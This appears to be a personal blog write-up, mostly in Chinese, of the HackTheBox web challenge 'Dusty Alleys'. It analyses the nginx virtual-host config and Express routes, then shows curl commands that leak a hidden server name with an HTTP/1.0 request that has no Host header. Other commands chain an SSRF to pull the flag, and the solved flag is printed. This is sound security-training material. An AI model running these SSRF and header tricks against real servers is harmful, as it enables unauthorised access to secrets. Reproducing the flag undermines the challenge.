---
layout: post
title: "HackTheBox - Dusty Alleys"
date: 2026-03-21
category: "Security Practice｜HackTheBox"
tags: []
draft: false
toc: true
comments: true
---

# HackTheBox - Dusty Alleys
<!-- more -->
* Challenge Scenario
    > In the dark, dusty underground labyrinth, the survivors feel lost and their resolve weakens. Just as despair sets in, they notice a faint light: a dilapidated, rusty robot emitting feeble sparks. Hoping for answers, they decide to engage with it.

## Background
* Nginx
* SSRF

## Recon
這一題和nginx的config以及feature有關，我真的很不喜歡這類型的題目，因為...誰會知道啊，web很容易出這種冷門的題目

首先，先分析local folder，看Dockerfile的寫法
```dockerfile
FROM node@sha256:b375b98d1dcd56f5783efdd80a4d6ff5a0d6f3ce7921ec99c17851db6cba2a93

RUN apk update && apk add nginx
ENV SECRET_ALLEY=REDACTED


COPY config/default.conf /etc/nginx/http.d/

WORKDIR /app
COPY ./challenge/package.json ./package.json
RUN npm install
COPY challenge/index.js ./index.js
COPY ./challenge/public ./public
COPY ./challenge/routes ./routes
COPY ./challenge/views ./views
RUN sed -i "s/\$SECRET_ALLEY/$SECRET_ALLEY/g" /etc/nginx/http.d/default.conf
COPY ./config/index.html /var/www/html/index.html
COPY ./config/evil-robot.jpg /var/www/html/evil-robot.jpg

EXPOSE 80
ENV FLAG=HTB{REDACTED}

CMD nginx && node index.js
```
從以上的內容看得出來大部分是常規的操作，重點是`SECRET_ALLEY`這個環境變數和nginx的config file有關，所以繼續看`default.conf`
```text
server {
        listen 80 default_server;
        server_name alley.$SECRET_ALLEY;

        location / {
                root /var/www/html/;  
                index index.html;
        }

        location /alley {
                proxy_pass http://localhost:1337;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto $scheme;
        }

        location /think {
                proxy_pass http://localhost:1337;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto $scheme;
        }
}

server {
        listen 80;
        server_name guardian.$SECRET_ALLEY;

        location /guardian {
                proxy_pass http://localhost:1337;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto $scheme;
        }
}
```
我們知道幾件事情
1. nginx有兩個virtual host，但是具體的server_name和前面提到的環境變數有關
2. 有幾個directory，包含`/`, `/alley`, `/think`, `/guardian`
3. 除了`/`以外，其他幾個directory request package會丟給`localhost:1337`處理，也就是`index.js`
4. 丟過去處理的時候會帶上`Host`等等header

到這邊為止，我們大概知道這一台web server的網路架構，但還不知道實際如何處理request
```javascript
const express = require("express");
const path = require("path")
const app = express();
const guardian = require("./routes/guardian");
const PORT = process.env.PORT || 1337;


app.set("view engine", "ejs");
app.set("views", path.join(process.cwd(), "views"));
app.use(express.static('public'));
app.use(guardian);

app.listen(PORT, () => {
  console.log(`Server Running on ${PORT}`);
});
```
從`index.js`中看得出來是用`ejs` render所以可能會有SSTI的問題，並且實際處理routes的request是`./routes/guardian.js`這個file
```javascript
const node_fetch = require("node-fetch");
const router = require("express").Router();

router.get("/alley", async (_, res) => {
  res.render("index");
});

router.get("/think", async (req, res) => {
  return res.json(req.headers);
});

router.get("/guardian", async (req, res) => {
  const quote = req.query.quote;

  if (!quote) return res.render("guardian");

  try {
    const location = new URL(quote);
    const direction = location.hostname;
    if (!direction.endsWith("localhost") && direction !== "localhost")
      return res.send("guardian", {
        error: "You are forbidden from talking with me.",
      });
  } catch (error) {
    return res.render("guardian", { error: "My brain circuits are mad." });
  }

  try {
    let result = await node_fetch(quote, {
      method: "GET",
      headers: { Key: process.env.FLAG || "HTB{REDACTED}" },
    }).then((res) => res.text());

    res.set("Content-Type", "text/plain");

    res.send(result);
  } catch (e) {
    console.error(e);
    return res.render("guardian", {
      error: "The words are lost in my circuits",
    });
  }
});

module.exports = router;
```
看起來很複雜，但其實只要按照route的部分trace就會比較有概念
* `/alley`: render `./views/index.ejs`，看起來沒有什麼用，實際去看會發現click `Start the Game` button會redirect to `/guardian` with 404 status code，所以我猜這只是一個引導解題的人的功能性的page
* `/think`: respone request header with json format，這個就比較有意思了，這場不會這樣寫，他就像是一個oracle一樣，會leak出一些server info"的感覺"
    ```javascript
    return res.json(req.headers);
    ```
* `/guardian`: 一般來說如果request這個directory，會return 404，那是因為前面的nginx config設定成只有`Host: guardian.$SECRET_ALLEY`的前提下才能request，但沒關係，可以先trace code，我發現他有一個SSRF的問題，他是用GET method的方式request帶著`quote`參數，而這個參數一定要是localhost才能往下，然後只要<span style="background-color: yellow">正確的request</span>，就會回傳Flag，而正確的request有兩個前提
    1. 我要能夠request這個directory，也就是我要知道`$SECRET_ALLEY`是什麼
    2. 進入`/guardian`之後要能夠自動讓response帶上Key這個header並且回傳回來

## Exploit
有關於第二個難點，我覺得可以先在local deploy server後嘗試，那就是利用`/think`會自動return request header的特性
```bash
$ curl -H "Host: guardian.REDACTED" "http://localhost:1337/guardian?quote=http://localhost:1337/think"
{"key":"HTB{REDACTED}","accept":"*/*","user-agent":"node-fetch/1.0 (+https://github.com/bitinn/node-fetch)","accept-encoding":"gzip,deflate","connection":"close","host":"localhost:1337"}
```
代表這個request是成立的

現在難的地方是要如何知道`$SECRET_ALLEY`，我卡了超久，我知道這一定和nginx的config或feature有關，畢竟之前也有寫過某種nginx feature的題目[^2]，但真的想不出來，我知道一定是透過`/think` route回傳回來，所以參考[^1]的解析
> However, according to the HTTP/1.0 standard, the Host header is optional and not mandatory. By sending an HTTP/1.0 request directly to the challenge’s IP:PORT without a Host header, Nginx defaults to routing the request to alley.$SECRET_ALLEY, as this vhost is configured with default_server.
> 
> By sending an HTTP/1.0 request to the /think endpoint without the Host header, I can get the value of SECRET_ALLEY from the leaked information.

所以完整的command如下，如果Host header不完整，只要指定HTTP為1.0版本，nginx就會自動帶上完整的default_server的server_name
```bash
$ curl -H "Host:" "http://154.57.164.79:30185/think" --http1.0
{"host":"alley.firstalleyontheleft.com","x-real-ip":"1.170.107.42","x-forwarded-for":"1.170.107.42","x-forwarded-proto":"http","connection":"close","user-agent":"curl/7.81.0","accept":"*/*"}%
$ curl -H "Host: guardian.firstalleyontheleft.com" --http1.0 "http://154.57.164.79:30185/guardian?quote=http://localhost:1337/think"    {"key":"HTB{DUsT_1n_my_3y3s_l33t}","accept":"*/*","user-agent":"node-fetch/1.0 (+https://github.com/bitinn/node-fetch)","accept-encoding":"gzip,deflate","connection":"close","host":"localhost:1337"}
```

Flag: `HTB{DUsT_1n_my_3y3s_l33t}`

## Reference
[^1]:[Hack The Box: Dusty Alleys](https://medium.com/@natsu.2013/hack-the-box-dusty-alleys-bbce5c2bfe24)
[^2]:[AIS3-EOF-2024 - Internal]({{base.url}}/AIS3-EOF-2024/)